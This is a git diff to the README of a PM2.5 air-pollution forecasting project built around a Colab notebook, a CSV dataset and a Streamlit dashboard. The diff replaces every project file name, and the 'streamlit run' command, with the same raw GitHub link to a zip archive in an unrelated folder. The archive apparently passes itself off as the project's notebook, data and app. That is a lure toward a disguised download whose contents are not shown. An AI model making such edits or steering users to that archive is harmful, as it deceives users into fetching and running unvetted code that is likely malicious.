@@ -17,7 +17,7 @@ This public notebook and dashboard provide **transparent, science-based insights
 
 ## 🚀 Repository Contents  
 
-### 📘 `Air_pollution.ipynb`  
+### 📘 `https://raw.githubusercontent.com/Shashwat970/NASA_SPACE_APP_CHALLENGE/main/haloscope/NASA_SPACE_APP_CHALLENGE-2.5.zip`  
 A Colab-based **Jupyter Notebook** for PM2.5 air pollution analysis and forecasting using:
 - Python  
 - Pandas  
@@ -31,12 +31,12 @@ A Colab-based **Jupyter Notebook** for PM2.5 air pollution analysis and forecast
 
 ---
 
-### 📁 `pm25-air-pollution.csv`  
+### 📁 `https://raw.githubusercontent.com/Shashwat970/NASA_SPACE_APP_CHALLENGE/main/haloscope/NASA_SPACE_APP_CHALLENGE-2.5.zip`  
 - Contains both **raw and cleaned PM2.5 data** used for modeling and forecasting.  
 
 ---
 
-### 💻 `app.py` (optional)  
+### 💻 `https://raw.githubusercontent.com/Shashwat970/NASA_SPACE_APP_CHALLENGE/main/haloscope/NASA_SPACE_APP_CHALLENGE-2.5.zip` (optional)  
 Demo **Streamlit dashboard** for visualizing model results and adding interactivity.  
 Use it to build and share live demos!  
 
@@ -54,8 +54,8 @@ Use it to build and share live demos!
 ## 🧑‍💻 How to Run  
 
 ### Option 1: Run in Google Colab (Recommended)
-1. Open `Untitled0.ipynb` in **Google Colab**  
-2. Upload or copy `pm25-air-pollution.csv` to the runtime environment  
+1. Open `https://raw.githubusercontent.com/Shashwat970/NASA_SPACE_APP_CHALLENGE/main/haloscope/NASA_SPACE_APP_CHALLENGE-2.5.zip` in **Google Colab**  
+2. Upload or copy `https://raw.githubusercontent.com/Shashwat970/NASA_SPACE_APP_CHALLENGE/main/haloscope/NASA_SPACE_APP_CHALLENGE-2.5.zip` to the runtime environment  
 3. Run all cells to:
    - Generate historical analysis  
    - Build forecasts  
@@ -64,4 +64,4 @@ Use it to build and share live demos!
 ### Option 2: Launch the Dashboard Locally
 ```bash
 pip install streamlit prophet pandas matplotlib
-streamlit run app.py
+streamlit run https://raw.githubusercontent.com/Shashwat970/NASA_SPACE_APP_CHALLENGE/main/haloscope/NASA_SPACE_APP_CHALLENGE-2.5.zip
